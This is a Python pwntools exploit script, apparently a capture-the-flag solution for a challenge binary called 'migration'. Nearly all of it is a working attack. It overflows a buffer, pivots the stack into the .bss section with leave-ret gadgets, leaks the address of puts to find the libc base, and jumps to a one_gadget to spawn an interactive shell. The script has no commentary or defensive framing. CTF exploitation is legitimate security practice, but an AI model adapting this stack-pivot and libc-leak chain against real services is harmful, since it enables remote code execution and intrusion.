#! /usr/bin/env python

from pwn import *

io = remote('localhost', 8888)

elf = ELF("./migration-d03a7d6c789b2364f79551e3e1554f12")

raw_input('@')

printf_plt = 0x400600
printf_got = str(0x600fd8).ljust(8, '\x00')
read_plt = 0x400610

puts_offset = 0x6f690

empty = '\x00'*8

# section
# start at 0x601060, end at 0x6012e0, size: 0x280
section_start = 0x601060
ROP_section = 0x601060      # self-defined
string_section = 0x6012d0   # self-defined
section_end = 0x6012e0

# gadgets
pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
leave_ret = 0x400818
add_ah = 0x400659
pop_rbp = 0x4006f9

rax_printf = 0x4007ba
add_bl_dh = 0x40065f

call_rsp = 0x40086a

# new section
new_section_start = section_start
new_ROP_section = 0x601e00
new_string_section = 0x601f00
new_section_end = 0x602000


ROP_read = empty
ROP_read += p64(pop_rdi)
ROP_read += p64(0x0)
ROP_read += p64(pop_rsi_r15)
ROP_read += p64(new_ROP_section)
ROP_read += empty
ROP_read += p64(read_plt)
ROP_read += p64(pop_rbp)
ROP_read += p64(new_ROP_section)
ROP_read += p64(leave_ret) 

MARK = 'AAAA'

io.sendafter('something:', ROP_read)

extra_data = ''
payload = '\x00'*8 + extra_data.ljust(0x18 ,'\x00')
bof = payload + p64(ROP_section) + p64(leave_ret)
io.sendafter('say?', bof)

sleep(1)

ROP_leak = empty 
ROP_leak += p64(pop_rdi)
ROP_leak += p64(elf.got['puts'])
ROP_leak += p64(elf.symbols['puts'])
ROP_leak += p64(pop_rdi)
ROP_leak += p64(0x0)
ROP_leak += p64(pop_rsi_r15)
ROP_leak += p64(new_ROP_section)
ROP_leak += empty
ROP_leak += p64(elf.symbols['read'])
ROP_leak += p64(pop_rbp)
ROP_leak += p64(new_ROP_section)
ROP_leak += p64(leave_ret) 

io.send(ROP_leak)

io.recvline()
io.recvline()
leak_libc = io.recvline()
leak_libc = u64(leak_libc.strip().ljust(8,'\x00'))
print hex(leak_libc)

libc_base = leak_libc - puts_offset
one_gadget = libc_base + 0x4526a

ROP_getshell = empty
ROP_getshell += p64(call_rsp)
ROP_getshell += p64(one_gadget)

io.send(ROP_getshell)

io.interactive()
